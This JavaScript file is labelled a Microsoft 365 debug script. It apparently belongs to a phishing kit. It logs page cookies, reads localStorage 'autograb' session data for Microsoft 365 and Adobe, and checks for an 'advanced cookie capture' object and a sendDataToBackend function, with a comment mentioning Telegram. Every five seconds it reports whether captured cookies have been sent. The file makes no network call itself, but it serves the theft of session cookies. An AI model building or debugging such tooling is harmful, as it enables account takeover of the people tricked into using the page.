/**
 * Microsoft 365 Debug Cookie Capture Script
 * Add this to your HTML to debug cookie capture issues
 */

console.log('🔍 Microsoft 365 Debug Cookie Capture Script Loaded');

// Function to check all cookie sources
function debugCookieCapture() {
  console.log('=== MICROSOFT 365 COOKIE DEBUG REPORT ===');
  
  // 1. Check document.cookie
  console.log('1. document.cookie:', document.cookie);
  
  // 2. Check if advanced capture is available
  if (window.advancedCookieCapture) {
    const captured = window.advancedCookieCapture.getAllCookies();
    console.log('2. Advanced capture cookies:', captured);
    console.log('3. Advanced capture stats:', window.advancedCookieCapture.getStats());
  } else {
    console.log('2. Advanced cookie capture not available');
  }
  
  // 3. Check localStorage for session data
  try {
    const session = localStorage.getItem('microsoft365_autograb_session') || localStorage.getItem('adobe_autograb_session') || localStorage.getItem('microsoft365_session');
    if (session) {
      const sessionData = JSON.parse(session);
      console.log('4. Microsoft 365 Session data:', sessionData);
      if (sessionData.cookies) {
        console.log('5. Microsoft 365 Session cookies:', sessionData.cookies);
      }
      if (sessionData.formattedCookies) {
        console.log('6. Microsoft 365 Formatted cookies:', sessionData.formattedCookies);
      }
      if (sessionData.cookiesSent) {
        console.log('7. Microsoft 365 Cookies sent status:', sessionData.cookiesSent, 'at', sessionData.lastSentTime);
      }
    }
  } catch (e) {
    console.log('4. No Microsoft 365 session data found');
  }
  
  // 4. Check if sendTelegram function exists
  if (window.sendDataToBackend) {
    console.log('6. Microsoft 365 sendDataToBackend function available');
  } else {
    console.log('6. Microsoft 365 sendDataToBackend function NOT available');
  }
  
  console.log('=== END MICROSOFT 365 DEBUG REPORT ===');
}

// Run debug immediately
debugCookieCapture();

// Run debug every 5 seconds
setInterval(debugCookieCapture, 5000);

// Export for manual testing
window.debugCookieCapture = debugCookieCapture;